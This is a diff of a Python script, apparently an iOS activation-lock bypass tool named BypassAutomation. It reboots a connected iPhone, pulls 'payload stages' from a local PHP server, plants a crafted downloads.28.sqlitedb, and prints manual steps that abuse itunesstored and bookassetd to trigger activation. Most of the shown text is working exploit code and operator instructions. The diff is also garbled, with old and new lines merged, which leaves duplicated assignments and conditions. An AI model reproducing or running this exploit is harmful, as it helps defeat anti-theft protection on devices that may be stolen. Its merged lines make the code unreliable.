@@ -1,0 +1,80 @@
+‎client/activator.py‎
++15
+-25
+Lines changed: 15 additions & 25 deletions
+Original file line number	Diff line number	Diff line change
+@@ -23,7 +23,7 @@ class Style:
+class BypassAutomation:
+    def __init__(self):
+        #ipconfig getifaddr en1 and start php and start: php -S 192.168.0.106:8000 -t public
+        self.api_url = "http://your-ip:8000/get2.php" 
+        self.api_url = "192.168.0.106:8000/get2.php" 
+        self.timeouts = {
+            'asset_wait': 300,
+            'asset_delete_delay': 15,
+@@ -175,7 +175,7 @@ def get_guid_auto(self):
+                    break
+                found_bl = True
+                hit_count += 1
+                if hit_count <= 5:  # Логгируем первые 5 вхождений
+                if hit_count <= 5:  
+                    snippet = data[pos:pos+100]
+                    try:
+                        text = snippet[:60].decode('utf-8', errors='replace')
+@@ -211,7 +211,7 @@ def get_guid_auto(self):
+                    guid = raw_guid.decode('ascii').upper()
+                    # "Not trash" filter
+                    clean = guid.replace('0', '').replace('-', '')
+                    if len(clean) >= 8:  # хотя бы 4 hex-байта значимых
+                    if len(clean) >= 8: 
+                        candidates.append(guid)
+                        offset = start + window.find(raw_guid) - pos
+                        direction = "←" if offset < 0 else "→"
+@@ -304,15 +304,7 @@ def run(self):
+
+        input(f"\n{Style.YELLOW}Press Enter to deploy payload with this GUID...{Style.RESET}")
+
+        # 1. Initial Reboot
+        self.log("Performing initial reboot...", "step")
+        code, _, err = self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
+        if code != 0:
+            self.log(f"Reboot command failed: {err}", "warn")
+        else:
+            self.log("Reboot command sent, waiting 30 seconds...", "info")
+            time.sleep(30)
+       
+        # 2. API Call & Get All URLs
+        self.log("Requesting All Payload Stages from Server...", "step")
+        prd = self.device_info['ProductType']
+@@ -407,20 +399,18 @@ def run(self):
+
+        self.log("✅ Payload Deployed Successfully", "success")
+
+        # 6. Final Reboot
+        self.log("Rebooting device to trigger activation...", "step")
+        code, _, err = self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
+        if code != 0:
+            self.log(f"Reboot command failed: {err}. Device may reboot anyway.", "warn")
+        else:
+            self.log("Reboot command sent.", "info")
+        
+        print(f"\n{Style.GREEN}Process Complete.{Style.RESET}")
+        print(f"→ Device will process payload on boot.")
+        print(f"→ Monitor logs with: {Style.CYAN}idevicesyslog | grep -E 'itunesstored|bookassetd'{Style.RESET}")
+        print(f"→ Used GUID: {Style.BOLD}{self.guid}{Style.RESET}")
+        print(f"→ All stages pre-loaded: stage1, stage2, stage3")
+
+        print(f"\n{Style.GREEN}✅ Ready for manual activation.{Style.RESET}")
+        print(f"→ Payload is in place at /Downloads/downloads.28.sqlitedb")
+        print(f"→ Next steps (manual):")
+        print(f"  1. Reboot device (e.g. via Settings or hardware buttons)")
+        print(f"  2. After reboot, check if /iTunes_Control/iTunes/iTunesMetadata.plist appeared")
+        print(f"  3. Copy it to /Books/iTunesMetadata.plist")
+        print(f"     Example: {Style.CYAN}pymobiledevice3 afc pull /iTunes_Control/iTunes/iTunesMetadata.plist . && pymobiledevice3 afc push iTunesMetadata.plist /Books/iTunesMetadata.plist{Style.RESET}")
+        print(f"  4. Reboot again to trigger bookassetd stage")
+        print(f"→ Monitor logs: {Style.CYAN}idevicesyslog | grep -E 'itunesstored|bookassetd'{Style.RESET}")
+        print(f"→ Used GUID: {Style.BOLD}{self.guid}{Style.RESET}")
+        
+if __name__ == "__main__":
+    try:
+        BypassAutomation().run()
